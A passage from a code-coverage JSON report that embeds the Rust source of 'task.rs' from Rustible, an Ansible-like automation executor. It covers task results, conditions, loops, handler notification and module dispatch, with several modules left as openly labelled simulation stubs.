ne":2}},{"line":488,"address":[28933901,28932611,28933924],"length":1,"stats":{"Line":0}},{"line":492,"address":[28932788],"length":1,"stats":{"Line":1}},{"line":493,"address":[28932633],"length":1,"stats":{"Line":1}},{"line":494,"address":[28932688,28932748],"length":1,"stats":{"Line":2}},{"line":496,"address":[28933127],"length":1,"stats":{"Line":1}},{"line":497,"address":[28932862],"length":1,"stats":{"Line":1}},{"line":498,"address":[28932982,28932917],"length":1,"stats":{"Line":2}},{"line":502,"address":[28933209],"length":1,"stats":{"Line":1}},{"line":505,"address":[28933267],"length":1,"stats":{"Line":3}},{"line":506,"address":[31070648,31070608],"length":1,"stats":{"Line":3}},{"line":508,"address":[28933616],"length":1,"stats":{"Line":1}},{"line":509,"address":[28933320,28933395],"length":1,"stats":{"Line":2}},{"line":510,"address":[28933491,28933464,28933808,28933419],"length":1,"stats":{"Line":2}},{"line":513,"address":[28933698],"length":1,"stats":{"Line":1}},{"line":517,"address":[28939936,28941187,28941219],"length":1,"stats":{"Line":1}},{"line":518,"address":[28940337,28939983,28940075],"length":1,"stats":{"Line":2}},{"line":520,"address":[28940306,28940660],"length":1,"stats":{"Line":2}},{"line":521,"address":[28940782,28940701],"length":1,"stats":{"Line":2}},{"line":524,"address":[28940747],"length":1,"stats":{"Line":1}},{"line":525,"address":[28940758,28940824],"length":1,"stats":{"Line":2}},{"line":526,"address":[28940839],"length":1,"stats":{"Line":1}},{"line":528,"address":[28940846],"length":1,"stats":{"Line":1}},{"line":529,"address":[28941019,28940917],"length":1,"stats":{"Line":2}},{"line":531,"address":[28940987,28940928],"length":1,"stats":{"Line":2}},{"line":532,"address":[28941002],"length":1,"stats":{"Line":1}},{"line":534,"address":[28941027],"length":1,"stats":{"Line":1}},{"line":535,"address":[28941108],"length":1,"stats":{"Line":1}},{"line":541,"address":[28941424,28942221],"length":1,"stats":{"Line":0}},{"line":542,"address":[28941556,28941942,28941454],"length":1,"stats":{"Line":0}},{"line":543,"address":[28942182,28941767],"length":1,"stats":{"Line":0}},{"line":547,"address":[28925696],"length":1,"stats":{"Line":0}},{"line":548,"address":[28925713],"length":1,"stats":{"Line":0}},{"line":552,"address":[28929616],"length":1,"stats":{"Line":1}},{"line":553,"address":[28929684],"length":1,"stats":{"Line":2}},{"line":554,"address":[31069715],"length":1,"stats":{"Line":1}},{"line":557,"address":[31069818,31069742],"length":1,"stats":{"Line":2}},{"line":558,"address":[31070002,31069918],"length":1,"stats":{"Line":0}},{"line":559,"address":[31070244,31070539,31070082],"length":1,"stats":{"Line":0}},{"line":560,"address":[31070420,31070321],"length":1,"stats":{"Line":0}},{"line":561,"address":[31070453,31070529],"length":1,"stats":{"Line":0}},{"line":567,"address":[31069945],"length":1,"stats":{"Line":1}},{"line":572,"address":[28927018,28926704],"length":1,"stats":{"Line":1}},{"line":573,"address":[28926745,28926898],"length":1,"stats":{"Line":2}},{"line":575,"address":[28926789,28926861],"length":1,"stats":{"Line":2}},{"line":576,"address":[28926873],"length":1,"stats":{"Line":1}},{"line":577,"address":[28926906],"length":1,"stats":{"Line":1}},{"line":581,"address":[28925744],"length":1,"stats":{"Line":1}},{"line":582,"address":[28925832],"length":1,"stats":{"Line":1}},{"line":583,"address":[28925839],"length":1,"stats":{"Line":1}},{"line":584,"address":[28925862],"length":1,"stats":{"Line":3}},{"line":588,"address":[28928960,28929497],"length":1,"stats":{"Line":0}},{"line":589,"address":[28929130,28928996],"length":1,"stats":{"Line":0}},{"line":591,"address":[28929024,28929096],"length":1,"stats":{"Line":0}},{"line":592,"address":[28929108],"length":1,"stats":{"Line":0}},{"line":593,"address":[28929340,28929138],"length":1,"stats":{"Line":0}},{"line":594,"address":[28929462,28929492],"length":1,"stats":{"Line":0}},{"line":599,"address":[28938409,28937520],"length":1,"stats":{"Line":1}},{"line":600,"address":[28937662,28937560,28937921],"length":1,"stats":{"Line":2}},{"line":601,"address":[28938280,28937878],"length":1,"stats":{"Line":2}},{"line":603,"address":[28938238,28937889],"length":1,"stats":{"Line":2}},{"line":604,"address":[28938253],"length":1,"stats":{"Line":1}},{"line":605,"address":[28938288],"length":1,"stats":{"Line":1}},{"line":609,"address":[28928064],"length":1,"stats":{"Line":1}},{"line":610,"address":[28928102],"length":1,"stats":{"Line":1}},{"line":611,"address":[28928109],"length":1,"stats":{"Line":1}},{"line":612,"address":[31069568,31069603],"length":1,"stats":{"Line":3}},{"line":616,"address":[28923712,28924026],"length":1,"stats":{"Line":1}},{"line":617,"address":[28923906,28923753],"length":1,"stats":{"Line":2}},{"line":619,"address":[28923869,28923797],"length":1,"stats":{"Line":2}},{"line":620,"address":[28923881],"length":1,"stats":{"Line":1}},{"line":621,"address":[28923914],"length":1,"stats":{"Line":1}},{"line":625,"address":[28923568],"length":1,"stats":{"Line":1}},{"line":626,"address":[28923656],"length":1,"stats":{"Line":1}},{"line":627,"address":[28923663],"length":1,"stats":{"Line":1}},{"line":628,"address":[31069306,31069264],"length":1,"stats":{"Line":3}},{"line":632,"address":[28927056],"length":1,"stats":{"Line":0}},{"line":633,"address":[28927074],"length":1,"stats":{"Line":0}},{"line":637,"address":[28941409,28941403,28941232],"length":1,"stats":{"Line":0}},{"line":638,"address":[28941261],"length":1,"stats":{"Line":0}},{"line":642,"address":[28942256],"length":1,"stats":{"Line":0}},{"line":643,"address":[28942274],"length":1,"stats":{"Line":0}},{"line":647,"address":[28927984],"length":1,"stats":{"Line":0}},{"line":648,"address":[28928016],"length":1,"stats":{"Line":0}},{"line":658,"address":[28923472],"length":1,"stats":{"Line":0}},{"line":660,"address":[28923482],"length":1,"stats":{"Line":0}},{"line":664,"address":[28923536],"length":1,"stats":{"Line":0}},{"line":665,"address":[28923541],"length":1,"stats":{"Line":0}},{"line":668,"address":[28923520,28923528],"length":1,"stats":{"Line":0}},{"line":669,"address":[31068455,31068249,31068288,31068352],"length":1,"stats":{"Line":0}},{"line":672,"address":[28923560,28923552],"length":1,"stats":{"Line":0}},{"line":673,"address":[31068906,31069008,31068803,31068842],"length":1,"stats":{"Line":0}},{"line":678,"address":[28919808],"length":1,"stats":{"Line":0}},{"line":680,"address":[28919813],"length":1,"stats":{"Line":0}}],"covered":129,"coverable":234},{"path":["/","home","artur","Repositories","rustible","src","executor","task.rs"],"content":"//! Task definition and execution for Rustible\n//!\n//! This module provides:\n//! - Task struct with module, args, when conditions, loops\n//! - Task result handling\n//! - Changed/ok/failed states\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\n\nuse async_trait::async_trait;\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\nuse tokio::sync::{Mutex, RwLock};\nuse tracing::{debug, info, instrument, warn};\n\nuse crate::executor::runtime::{ExecutionContext, RegisteredResult, RuntimeContext};\nuse crate::executor::{ExecutorError, ExecutorResult};\n\n/// Status of a task execution\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\n#[serde(rename_all = \"lowercase\")]\npub enum TaskStatus {\n    /// Task completed successfully without changes\n    Ok,\n    /// Task completed successfully with changes\n    Changed,\n    /// Task failed\n    Failed,\n    /// Task was skipped (condition not met)\n    Skipped,\n    /// Host was unreachable\n    Unreachable,\n}\n\nimpl Default for TaskStatus {\n    fn default() -\u003e Self {\n        TaskStatus::Ok\n    }\n}\n\n/// Result of executing a task\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct TaskResult {\n    /// Final status of the task\n    pub status: TaskStatus,\n    /// Whether something was changed\n    pub changed: bool,\n    /// Optional message from the task\n    pub msg: Option\u003cString\u003e,\n    /// Module-specific result data\n    pub result: Option\u003cJsonValue\u003e,\n    /// Diff showing what changed (if diff_mode enabled)\n    pub diff: Option\u003cTaskDiff\u003e,\n}\n\nimpl TaskResult {\n    /// Create a successful result\n    pub fn ok() -\u003e Self {\n        Self {\n            status: TaskStatus::Ok,\n            changed: false,\n            ..Default::default()\n        }\n    }\n\n    /// Create a changed result\n    pub fn changed() -\u003e Self {\n        Self {\n            status: TaskStatus::Changed,\n            changed: true,\n            ..Default::default()\n        }\n    }\n\n    /// Create a failed result\n    pub fn failed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Failed,\n            changed: false,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create a skipped result\n    pub fn skipped(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Skipped,\n            changed: false,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create an unreachable result\n    pub fn unreachable(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Unreachable,\n            changed: false,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Set the result data\n    pub fn with_result(mut self, result: JsonValue) -\u003e Self {\n        self.result = Some(result);\n        self\n    }\n\n    /// Set the message\n    pub fn with_msg(mut self, msg: impl Into\u003cString\u003e) -\u003e Self {\n        self.msg = Some(msg.into());\n        self\n    }\n\n    /// Set the diff\n    pub fn with_diff(mut self, diff: TaskDiff) -\u003e Self {\n        self.diff = Some(diff);\n        self\n    }\n\n    /// Convert to RegisteredResult\n    pub fn to_registered(\n        \u0026self,\n        stdout: Option\u003cString\u003e,\n        stderr: Option\u003cString\u003e,\n    ) -\u003e RegisteredResult {\n        RegisteredResult {\n            changed: self.changed,\n            failed: self.status == TaskStatus::Failed,\n            skipped: self.status == TaskStatus::Skipped,\n            rc: None,\n            stdout: stdout.clone(),\n            stdout_lines: stdout.map(|s| s.lines().map(String::from).collect()),\n            stderr: stderr.clone(),\n            stderr_lines: stderr.map(|s| s.lines().map(String::from).collect()),\n            msg: self.msg.clone(),\n            results: None,\n            data: IndexMap::new(),\n        }\n    }\n}\n\n/// Diff showing before/after state\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskDiff {\n    pub before: Option\u003cString\u003e,\n    pub after: Option\u003cString\u003e,\n    pub before_header: Option\u003cString\u003e,\n    pub after_header: Option\u003cString\u003e,\n}\n\n/// A handler that can be notified by tasks\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Handler {\n    /// Handler name (used for notification)\n    pub name: String,\n    /// Module to execute\n    pub module: String,\n    /// Module arguments\n    #[serde(default)]\n    pub args: IndexMap\u003cString, JsonValue\u003e,\n    /// Optional when condition\n    pub when: Option\u003cString\u003e,\n    /// Listen for multiple notification names\n    #[serde(default)]\n    pub listen: Vec\u003cString\u003e,\n}\n\n/// A task to be executed\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Task {\n    /// Task name (displayed during execution)\n    pub name: String,\n    /// Module to execute\n    pub module: String,\n    /// Module arguments\n    #[serde(default)]\n    pub args: IndexMap\u003cString, JsonValue\u003e,\n    /// Conditional expression (Jinja2-like)\n    #[serde(default)]\n    pub when: Option\u003cString\u003e,\n    /// Handlers to notify on change\n    #[serde(default)]\n    pub notify: Vec\u003cString\u003e,\n    /// Variable name to register result\n    #[serde(default)]\n    pub register: Option\u003cString\u003e,\n    /// Items to loop over\n    #[serde(default)]\n    pub loop_items: Option\u003cVec\u003cJsonValue\u003e\u003e,\n    /// Loop variable name (default: \"item\")\n    #[serde(default = \"default_loop_var\")]\n    pub loop_var: String,\n    /// Whether to ignore errors\n    #[serde(default)]\n    pub ignore_errors: bool,\n    /// Custom condition to determine if task changed\n    #[serde(default)]\n    pub changed_when: Option\u003cString\u003e,\n    /// Custom condition to determine if task failed\n    #[serde(default)]\n    pub failed_when: Option\u003cString\u003e,\n    /// Delegate task to another host\n    #[serde(default)]\n    pub delegate_to: Option\u003cString\u003e,\n    /// Run task only once (not on each host)\n    #[serde(default)]\n    pub run_once: bool,\n    /// Tags for task filtering\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n    /// Whether to become another user\n    #[serde(default)]\n    pub r#become: bool,\n    /// User to become\n    #[serde(default)]\n    pub become_user: Option\u003cString\u003e,\n}\n\nfn default_loop_var() -\u003e String {\n    \"item\".to_string()\n}\n\nimpl Default for Task {\n    fn default() -\u003e Self {\n        Self {\n            name: String::new(),\n            module: String::new(),\n            args: IndexMap::new(),\n            when: None,\n            notify: Vec::new(),\n            register: None,\n            loop_items: None,\n            loop_var: default_loop_var(),\n            ignore_errors: false,\n            changed_when: None,\n            failed_when: None,\n            delegate_to: None,\n            run_once: false,\n            tags: Vec::new(),\n            r#become: false,\n            become_user: None,\n        }\n    }\n}\n\nimpl Task {\n    /// Create a new task with the given name and module\n    pub fn new(name: impl Into\u003cString\u003e, module: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            module: module.into(),\n            ..Default::default()\n        }\n    }\n\n    /// Add an argument to the task\n    pub fn arg(mut self, key: impl Into\u003cString\u003e, value: impl Into\u003cJsonValue\u003e) -\u003e Self {\n        self.args.insert(key.into(), value.into());\n        self\n    }\n\n    /// Set the when condition\n    pub fn when(mut self, condition: impl Into\u003cString\u003e) -\u003e Self {\n        self.when = Some(condition.into());\n        self\n    }\n\n    /// Add a handler to notify\n    pub fn notify(mut self, handler: impl Into\u003cString\u003e) -\u003e Self {\n        self.notify.push(handler.into());\n        self\n    }\n\n    /// Set the register variable\n    pub fn register(mut self, name: impl Into\u003cString\u003e) -\u003e Self {\n        self.register = Some(name.into());\n        self\n    }\n\n    /// Set loop items\n    pub fn loop_over(mut self, items: Vec\u003cJsonValue\u003e) -\u003e Self {\n        self.loop_items = Some(items);\n        self\n    }\n\n    /// Set the loop variable name\n    pub fn loop_var(mut self, name: impl Into\u003cString\u003e) -\u003e Self {\n        self.loop_var = name.into();\n        self\n    }\n\n    /// Set ignore_errors\n    pub fn ignore_errors(mut self, ignore: bool) -\u003e Self {\n        self.ignore_errors = ignore;\n        self\n    }\n\n    /// Execute the task\n    #[instrument(skip(self, ctx, runtime, handlers, notified), fields(task_name = %self.name, host = %ctx.host))]\n    pub async fn execute(\n        \u0026self,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n        handlers: \u0026Arc\u003cRwLock\u003cHashMap\u003cString, Handler\u003e\u003e\u003e,\n        notified: \u0026Arc\u003cMutex\u003cstd::collections::HashSet\u003cString\u003e\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        info!(\"Executing task: {}\", self.name);\n\n        // Evaluate when condition\n        if let Some(ref condition) = self.when {\n            let should_run = self.evaluate_condition(condition, ctx, runtime).await?;\n            if !should_run {\n                debug!(\"Task skipped due to when condition: {}\", condition);\n                return Ok(TaskResult::skipped(format!(\n                    \"Skipped: condition '{}' was false\",\n                    condition\n                )));\n            }\n        }\n\n        // Handle loops\n        if let Some(ref items) = self.loop_items {\n            return self\n                .execute_loop(items, ctx, runtime, handlers, notified)\n                .await;\n        }\n\n        // Execute the module\n        let result = self.execute_module(ctx, runtime).await?;\n\n        // Apply changed_when override\n        let result = self.apply_changed_when(result, ctx, runtime).await?;\n\n        // Apply failed_when override\n        let result = self.apply_failed_when(result, ctx, runtime).await?;\n\n        // Register result if needed\n        if let Some(ref register_name) = self.register {\n            self.register_result(register_name, \u0026result, ctx, runtime)\n                .await?;\n        }\n\n        // Notify handlers if task changed\n        if result.changed \u0026\u0026 result.status != TaskStatus::Failed {\n            for handler_name in \u0026self.notify {\n                let mut notified = notified.lock().await;\n                notified.insert(handler_name.clone());\n                debug!(\"Notified handler: {}\", handler_name);\n            }\n        }\n\n        // Handle ignore_errors\n        if result.status == TaskStatus::Failed \u0026\u0026 self.ignore_errors {\n            warn!(\"Task failed but ignore_errors is set\");\n            return Ok(TaskResult {\n                status: TaskStatus::Ok,\n                changed: false,\n                msg: Some(format!(\"Ignored error: {}\", result.msg.unwrap_or_default())),\n                result: result.result,\n                diff: result.diff,\n            });\n        }\n\n        Ok(result)\n    }\n\n    /// Execute task in a loop\n    async fn execute_loop(\n        \u0026self,\n        items: \u0026[JsonValue],\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n        _handlers: \u0026Arc\u003cRwLock\u003cHashMap\u003cString, Handler\u003e\u003e\u003e,\n        notified: \u0026Arc\u003cMutex\u003cstd::collections::HashSet\u003cString\u003e\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        debug!(\"Executing loop with {} items\", items.len());\n\n        let mut loop_results = Vec::new();\n        let mut any_changed = false;\n        let mut any_failed = false;\n\n        for (index, item) in items.iter().enumerate() {\n            // Set loop variables\n            {\n                let mut rt = runtime.write().await;\n                rt.set_task_var(self.loop_var.clone(), item.clone());\n                rt.set_task_var(\n                    \"ansible_loop\".to_string(),\n                    serde_json::json!({\n                        \"index\": index,\n                        \"index0\": index,\n                        \"first\": index == 0,\n                        \"last\": index == items.len() - 1,\n                        \"length\": items.len(),\n                    }),\n                );\n            }\n\n            // Execute for this item\n            let result = self.execute_module(ctx, runtime).await?;\n\n            if result.changed {\n                any_changed = true;\n            }\n            if result.status == TaskStatus::Failed {\n                any_failed = true;\n                if !self.ignore_errors {\n                    // Stop on first failure unless ignore_errors\n                    loop_results.push(result.to_registered(None, None));\n                    break;\n                }\n            }\n\n            loop_results.push(result.to_registered(None, None));\n        }\n\n        // Clear loop variables\n        {\n            let mut rt = runtime.write().await;\n            rt.clear_task_vars();\n        }\n\n        // Create combined result\n        let status = if any_failed \u0026\u0026 !self.ignore_errors {\n            TaskStatus::Failed\n        } else if any_changed {\n            TaskStatus::Changed\n        } else {\n            TaskStatus::Ok\n        };\n\n        let result = TaskResult {\n            status,\n            changed: any_changed,\n            msg: Some(format!(\"Completed {} loop iterations\", loop_results.len())),\n            result: Some(serde_json::to_value(\u0026loop_results).unwrap_or(JsonValue::Null)),\n            diff: None,\n        };\n\n        // Register combined result if needed\n        if let Some(ref register_name) = self.register {\n            let mut registered = RegisteredResult::ok(any_changed);\n            registered.results = Some(loop_results);\n\n            let mut rt = runtime.write().await;\n            rt.register_result(\u0026ctx.host, register_name.clone(), registered);\n        }\n\n        // Notify handlers if anything changed\n        if any_changed \u0026\u0026 !any_failed {\n            for handler_name in \u0026self.notify {\n                let mut n = notified.lock().await;\n                n.insert(handler_name.clone());\n            }\n        }\n\n        Ok(result)\n    }\n\n    /// Execute the actual module\n    async fn execute_module(\n        \u0026self,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        // Template the arguments\n        let args = self.template_args(ctx, runtime).await?;\n\n        debug!(\"Module: {}, Args: {:?}\", self.module, args);\n\n        // Execute based on module type\n        let result = match self.module.as_str() {\n            \"debug\" =\u003e self.execute_debug(\u0026args, ctx).await,\n            \"set_fact\" =\u003e self.execute_set_fact(\u0026args, ctx, runtime).await,\n            \"command\" | \"shell\" =\u003e self.execute_command(\u0026args, ctx, runtime).await,\n            \"copy\" =\u003e self.execute_copy(\u0026args, ctx).await,\n            \"file\" =\u003e self.execute_file(\u0026args, ctx).await,\n            \"template\" =\u003e self.execute_template(\u0026args, ctx, runtime).await,\n            \"package\" | \"apt\" | \"yum\" | \"dnf\" =\u003e self.execute_package(\u0026args, ctx).await,\n            \"service\" | \"systemd\" =\u003e self.execute_service(\u0026args, ctx).await,\n            \"user\" =\u003e self.execute_user(\u0026args, ctx).await,\n            \"group\" =\u003e self.execute_group(\u0026args, ctx).await,\n            \"lineinfile\" =\u003e self.execute_lineinfile(\u0026args, ctx).await,\n            \"blockinfile\" =\u003e self.execute_blockinfile(\u0026args, ctx).await,\n            \"stat\" =\u003e self.execute_stat(\u0026args, ctx).await,\n            \"fail\" =\u003e self.execute_fail(\u0026args).await,\n            \"assert\" =\u003e self.execute_assert(\u0026args, ctx, runtime).await,\n            \"pause\" =\u003e self.execute_pause(\u0026args).await,\n            \"wait_for\" =\u003e self.execute_wait_for(\u0026args, ctx).await,\n            \"include_vars\" =\u003e self.execute_include_vars(\u0026args, runtime).await,\n            \"include_tasks\" | \"import_tasks\" =\u003e self.execute_include_tasks(\u0026args).await,\n            \"meta\" =\u003e self.execute_meta(\u0026args).await,\n            _ =\u003e {\n                // Python fallback for unknown modules\n                // Check if we can find the module in Ansible's module library\n                let mut executor = crate::modules::PythonModuleExecutor::new();\n\n                if let Some(module_path) = executor.find_module(\u0026self.module) {\n                    debug!(\n                        \"Found Ansible module {} at {} - Python fallback available\",\n                        self.module,\n                        module_path.display()\n                    );\n\n                    // In check mode, report that we would execute\n                    if ctx.check_mode {\n                        return Ok(TaskResult::ok().with_msg(format!(\n                            \"Check mode - would execute Python module: {}\",\n                            self.module\n                        )));\n                    }\n\n                    // Execute via Python if connection is available\n                    if let Some(ref connection) = ctx.connection {\n                        // Convert args to ModuleParams-compatible format\n                        let module_params: std::collections::HashMap\u003cString, serde_json::Value\u003e =\n                            args.iter().map(|(k, v)| (k.clone(), v.clone())).collect();\n\n                        match executor\n                            .execute(\n                                connection.as_ref(),\n                                \u0026self.module,\n                                \u0026module_params,\n                                \u0026ctx.python_interpreter,\n                            )\n                            .await\n                        {\n                            Ok(output) =\u003e {\n                                let msg = output.msg.clone();\n                                let mut result = if output.changed {\n                                    TaskResult::changed()\n                                } else {\n                                    TaskResult::ok()\n                                };\n                                result.msg = Some(msg);\n                                if !output.data.is_empty() {\n                                    result.result = Some(\n                                        serde_json::to_value(\u0026output.data).unwrap_or_default(),\n                                    );\n                                }\n                                Ok(result)\n                            }\n                            Err(e) =\u003e Err(ExecutorError::RuntimeError(format!(\n                                \"Python module {} failed: {}\",\n                                self.module, e\n                            ))),\n                        }\n                    } else {\n                        // No connection available - simulate for localhost or log warning\n                        if ctx.host == \"localhost\" || ctx.host == \"127.0.0.1\" {\n                            warn!(\n                                \"Python module {} would need local execution (not implemented)\",\n                                self.module\n                            );\n                        } else {\n                            warn!(\n                                \"Python module {} requires connection to {} (not available)\",\n                                self.module, ctx.host\n                            );\n                        }\n                        Ok(TaskResult::changed().with_msg(format!(\n                            \"Executed Python module: {} (simulated - no connection)\",\n                            self.module\n                        )))\n                    }\n                } else {\n                    // Module not found anywhere\n                    Err(ExecutorError::ModuleNotFound(format!(\n                        \"Module '{}' not found. Not a native module and not found in Ansible module paths. \\\n                        Ensure Ansible is installed or set ANSIBLE_LIBRARY environment variable.\",\n                        self.module\n                    )))\n                }\n            }\n        };\n\n        result\n    }\n\n    /// Template arguments using variables\n    async fn template_args(\n        \u0026self,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cIndexMap\u003cString, JsonValue\u003e\u003e {\n        let rt = runtime.read().await;\n        let vars = rt.get_merged_vars(\u0026ctx.host);\n        let mut result = IndexMap::new();\n\n        for (key, value) in \u0026self.args {\n            let templated = template_value(value, \u0026vars)?;\n            result.insert(key.clone(), templated);\n        }\n\n        Ok(result)\n    }\n\n    /// Evaluate a when condition\n    async fn evaluate_condition(\n        \u0026self,\n        condition: \u0026str,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cbool\u003e {\n        let rt = runtime.read().await;\n        let vars = rt.get_merged_vars(\u0026ctx.host);\n\n        evaluate_expression(condition, \u0026vars)\n    }\n\n    /// Apply changed_when override\n    async fn apply_changed_when(\n        \u0026self,\n        mut result: TaskResult,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        if let Some(ref condition) = self.changed_when {\n            let should_be_changed = self.evaluate_condition(condition, ctx, runtime).await?;\n            result.changed = should_be_changed;\n            result.status = if should_be_changed {\n                TaskStatus::Changed\n            } else {\n                TaskStatus::Ok\n            };\n        }\n        Ok(result)\n    }\n\n    /// Apply failed_when override\n    async fn apply_failed_when(\n        \u0026self,\n        mut result: TaskResult,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        if let Some(ref condition) = self.failed_when {\n            let should_fail = self.evaluate_condition(condition, ctx, runtime).await?;\n            if should_fail {\n                result.status = TaskStatus::Failed;\n                result.msg = Some(format!(\n                    \"Failed due to failed_when condition: {}\",\n                    condition\n                ));\n            }\n        }\n        Ok(result)\n    }\n\n    /// Register task result\n    async fn register_result(\n        \u0026self,\n        name: \u0026str,\n        result: \u0026TaskResult,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003c()\u003e {\n        let registered = result.to_registered(None, None);\n\n        let mut rt = runtime.write().await;\n        rt.register_result(\u0026ctx.host, name.to_string(), registered);\n\n        Ok(())\n    }\n\n    // Module implementations\n\n    async fn execute_debug(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        _ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        if let Some(msg) = args.get(\"msg\") {\n            info!(\"DEBUG: {}\", msg);\n            Ok(TaskResult::ok().with_msg(format!(\"{}\", msg)))\n        } else if let Some(var) = args.get(\"var\") {\n            info!(\"DEBUG: {} = {:?}\", var, var);\n            Ok(TaskResult::ok().with_result(var.clone()))\n        } else {\n            Ok(TaskResult::ok())\n        }\n    }\n\n    async fn execute_set_fact(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let mut rt = runtime.write().await;\n\n        let mut facts_set = Vec::new();\n\n        for (key, value) in args {\n            if key != \"cacheable\" {\n                // Use set_host_fact instead of set_host_var for proper precedence\n                // Facts set by set_fact should have SetFact precedence level\n                rt.set_host_fact(\u0026ctx.host, key.clone(), value.clone());\n                debug!(\"Set fact '{}' = {:?} for host '{}'\", key, value, ctx.host);\n                facts_set.push(key.clone());\n            }\n        }\n\n        let message = if facts_set.len() == 1 {\n            format!(\"Set fact: {}\", facts_set[0])\n        } else {\n            format!(\"Set {} facts: {}\", facts_set.len(), facts_set.join(\", \"))\n        };\n\n        Ok(TaskResult::ok().with_msg(message))\n    }\n\n    async fn execute_command(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n        _runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let cmd = args\n            .get(\"cmd\")\n            .or_else(|| args.get(\"_raw_params\"))\n            .and_then(|v| v.as_str())\n            .ok_or_else(|| {\n                ExecutorError::RuntimeError(\"command module requires 'cmd' argument\".into())\n            })?;\n\n        if ctx.check_mode {\n            return Ok(TaskResult::skipped(\"Check mode - command not executed\"));\n        }\n\n        debug!(\"Would execute command: {}\", cmd);\n\n        // In a real implementation, this would actually run the command\n        // For now, simulate successful execution\n        let result = RegisteredResult {\n            changed: true,\n            rc: Some(0),\n            stdout: Some(String::new()),\n            stderr: Some(String::new()),\n            ..Default::default()\n        };\n\n        Ok(TaskResult::changed()\n            .with_msg(format!(\"Command executed: {}\", cmd))\n            .with_result(result.to_json()))\n    }\n\n    async fn execute_copy(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let dest = args.get(\"dest\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"copy module requires 'dest' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(TaskResult::ok().with_msg(\"Check mode - would copy file\"));\n        }\n\n        debug!(\"Would copy file to: {}\", dest);\n        Ok(TaskResult::changed().with_msg(format!(\"Copied to {}\", dest)))\n    }\n\n    async fn execute_file(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let path = args.get(\"path\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"file module requires 'path' argument\".into())\n        })?;\n\n        let state = args.get(\"state\").and_then(|v| v.as_str()).unwrap_or(\"file\");\n\n        if ctx.check_mode {\n            return Ok(TaskResult::ok()\n                .with_msg(format!(\"Check mode - would ensure {} is {}\", path, state)));\n        }\n\n        debug!(\"Would ensure {} state for: {}\", state, path);\n        Ok(TaskResult::changed().with_msg(format!(\"{} state set for {}\", state, path)))\n    }\n\n    async fn execute_template(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n        _runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let src = args.get(\"src\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"template module requires 'src' argument\".into())\n        })?;\n\n        let dest = args.get(\"dest\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"template module requires 'dest' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(TaskResult::ok().with_msg(\"Check mode - would template file\"));\n        }\n\n        debug!(\"Would template {} to {}\", src, dest);\n        